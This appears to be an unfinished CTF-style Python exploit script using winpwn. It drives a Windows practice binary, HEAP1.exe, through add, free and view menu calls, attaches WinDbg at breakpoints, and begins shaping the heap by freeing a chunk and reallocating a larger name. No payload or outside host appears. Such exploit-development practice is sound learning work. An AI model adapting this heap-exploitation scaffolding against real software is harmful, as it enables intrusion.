from winpwn import  * 

def add(code, name, age) : 
    p.sendline("1")
    p.recvuntil(": ")
    p.sendline(str(code)) 
    p.recvuntil(": ")
    p.sendline(name)
    p.recvuntil(": ")
    p.sendline(str(age))

def free(code) : 
    p.sendline("3")
    p.recvuntil(": ")
    p.sendline(str(code)) 

def view(code) : 
    p.sendline("2") 
    p.recvuntil(": ")
    p.sendline(str(code)) 

context.log_level = "debug"
p = process("HEAP1.exe") 

for i in range(1,5) : 
    add(i, chr(0x61 + i) * 0xb, i) 


windbg.attach(p, """bu E71330
                    bu E7127A""")
free(2)
# free(1) 
# free(3)
add(5, 'f' * 0x60, 5) 
# free(0)
# add()
# view(0)
# free(0)
# windbg.attach(p)
p.interactive()
